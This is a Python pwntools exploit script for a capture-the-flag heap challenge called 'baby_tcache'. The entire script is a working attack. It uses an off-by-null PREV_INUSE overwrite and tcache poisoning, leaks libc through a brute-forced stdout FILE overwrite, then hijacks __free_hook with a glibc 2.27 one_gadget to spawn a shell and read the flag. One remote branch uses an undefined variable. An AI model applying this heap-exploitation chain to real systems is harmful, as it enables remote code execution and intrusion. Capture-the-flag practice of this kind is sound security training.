#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./baby_tcache"

rhp2 = {'host':"localhost",'port':12800}
context(os='linux',arch='amd64')
binf = ELF(FILENAME)

malloc_max = 0x2000
entry_count = 0 #entry is limited to 0x9

def alloc(conn,size,data):
  global entry_count
  if entry_count==0xa:
    print("OVER MAX ALLOC ENTRY")
    print("PRESS KEY AND EXIT")
    raw_input()
  else:
    entry_count+=1

  if malloc_max<=size:
    print("[x]too large malloc. EXIT")
    exit(1)
  conn.recvuntil(": ")
  conn.sendline("1")
  conn.recvuntil(":")
  conn.sendline(str(size))
  conn.recvuntil(":")
  conn.send(data)

def delete(conn,ix):
  global entry_count
  entry_count -= 1
  conn.recvuntil(": ")
  conn.sendline("2")
  conn.recvuntil(":")
  conn.sendline(str(ix))

failure_count = 0
offset__IO_stdfile_2_lock = 0x3ed8b0 #libc2.27
offset_onerce = [0x4f2c5,0x4f322,0x10a38c] #[1]:constraint rsp+0x40==NULL
offset_free_hook = 0x3ed8e8

def exploit(conn):
  global failure_count
  global entry_count
  entry_count = 0
  _IO_CURRENTLY_PUTTING = 0x800 #flags for _IO_FILE structure
  _IO_IS_APPENDING = 0x1000
  
  #allocate chunks
  alloc(conn,0x500,"A"*0x500) #0
  alloc(conn,0x60,"Q"*8) #1
  alloc(conn,0x70,"R"*8) #2
  alloc(conn,0x80,"S"*8) #3
  alloc(conn,0x68,"B"*0x8)   #4
  alloc(conn,0x5f0,p8(0xff)*0x5f0) #5
  alloc(conn,0x30,"D"*0x8) #6 to avoid consolidating with top_chunk

  #overwrite #5's PREV_INUSE
  delete(conn,0)
  delete(conn,4)
  alloc(conn,0x68,"E"*0x60 + p64(0x510+0x70+0x80+0x90+0x70))  #0  #overwrite PREV_INUSE

  #consolidate chunks and make a big chunk
  delete(conn,5)

  #connect #1 to tcache
  delete(conn,1)

  #overwrite #1's fd with main_arena+xx
  alloc(conn,0x500,"F"*0x500) #1

  #overwrite #1's fd(main_arena+xx) 's low 2byte (16bit brute-force)
  alloc(conn,0x60+0x20,p16(0x0760))
 
  #get chunk on stdout 
  alloc(conn,0x68,"H"*8)
  alloc(conn,0x68,p64(0xfbad2887|_IO_CURRENTLY_PUTTING|_IO_IS_APPENDING) + p64(0)*3 + p8(0)) #4

########################################################
  #try til &stdout's fourth nibble == 0x0

  temp = conn.recv(1)
  if temp=="$" or temp=="r":
    failure_count += 1
    print("ERROR PRONE: "+hex(failure_count))
    if(failure_count > 0x30):
      return
    conn = remote(rhp2["host"],rhp2["port"])
    exploit(conn)
####################################################

  #calc some addrs
  conn.recv(7)
  _IO_stdfile_2_lock = unpack(conn.recv(8))
  libc_base = _IO_stdfile_2_lock - offset__IO_stdfile_2_lock
  onerce = libc_base + offset_onerce[1]
  free_hook = libc_base + offset_free_hook
  print("_IO_stdfile_2_lock: "+hex(_IO_stdfile_2_lock))
  print("libc base: "+hex(libc_base))
  print("one gadget rce: "+hex(onerce))
  print("free_hook: "+hex(free_hook))

  
  #connect #3 to tcache
  delete(conn,3)
  #overwrite #3's fd with main_arena+xx
  alloc(conn,0x70-0x20,"I"*8)
  #overwrite #3's fd to ...
  alloc(conn,0x40,p64(free_hook))


  #allocate chunk on free_hook and overwrite with one_gadget RCE
  alloc(conn,0x80,"K"*8)
  ##
  delete(conn,6) #to make a space, delete the chunk which was intended to avoid consolidating with tcache
  ##
  alloc(conn,0x80,p64(onerce))

  #invoke free_hook and invoke one_gadget RCE
  conn.recvuntil(": ")
  conn.sendline("2")
  conn.sendline("0")
  raw_input("PRESS ANY KEY. GOT SHELL?")
  conn.sendline("cat /flag")

if len(sys.argv)>1:
  if sys.argv[1][0]=="d":
    cmd = """
    """
    conn = gdb.debug(FILENAME,cmd)
  elif sys.argv[1][0]=="r":
    conn = remote(rhp1["host"],rhp1["port"])
else:
    conn = remote(rhp2['host'],rhp2['port'])
exploit(conn)
conn.interactive()

